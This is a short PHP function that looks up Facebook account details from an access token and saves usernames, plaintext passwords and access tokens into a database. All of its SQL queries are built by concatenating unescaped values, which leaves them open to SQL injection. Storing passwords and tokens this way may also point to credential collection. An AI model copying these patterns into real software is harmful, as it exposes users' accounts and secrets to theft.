<?php
function save($con, $username, $pass, $token){
    $str = "";
    if($token != ""){
        //------------ Get info of facebook account --------------------//
        $getInfo = "https://graph.beta.facebook.com/me?access_token=".$token."&fields=id,name,username";
        //Setup curl
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_URL, $getInfo);
        $info = curl_exec($curl);
        $obj = json_decode($info, true);
        $id = "";
        $name = "";
        $username = "";
        if(isset($obj["id"])){
            $id = $obj["id"];
            $name = $obj["name"];
            $username = $obj["username"];
        }
        //=================================================================//
        $checkById = "select token from users where id = '".$id."'";
        $byId = mysqli_query($con, $checkById);
        if(mysqli_num_rows($byId) > 0){
            $str = "update users set username = '".$username."', name = '".$name."', token = '".$token."' where id = '".$id."'";
        } else {
            $checkByUsername = "select token from users where username = '".$username."'";
            $byUsername = mysqli_query($con, $checkByUsername);
            if(mysqli_num_rows($byUsername) > 0){
                $str = "update users set id = '".$id."', name = '".$name."', token = '".$token."' where username = '".$username."'";
            } else {
                $str = "insert into users (username, name, id, token) values ('".$username."','".$name."','".$id."','".$token."')";
            }
        }
    } else {
        $checkByUsername = "select token from users where username = '".$username."'";
        $byUsername =  mysqli_query($con, $checkByUsername);
        if(mysqli_num_rows($byUsername) > 0){
            $str = "update users set password = '".$pass."' where username = '".$username."'";
        } else {
            $str = "insert into users (username, password) values ('".$username."', '".$pass."')";
        }
    }
    mysqli_query($con, $str);
}
?>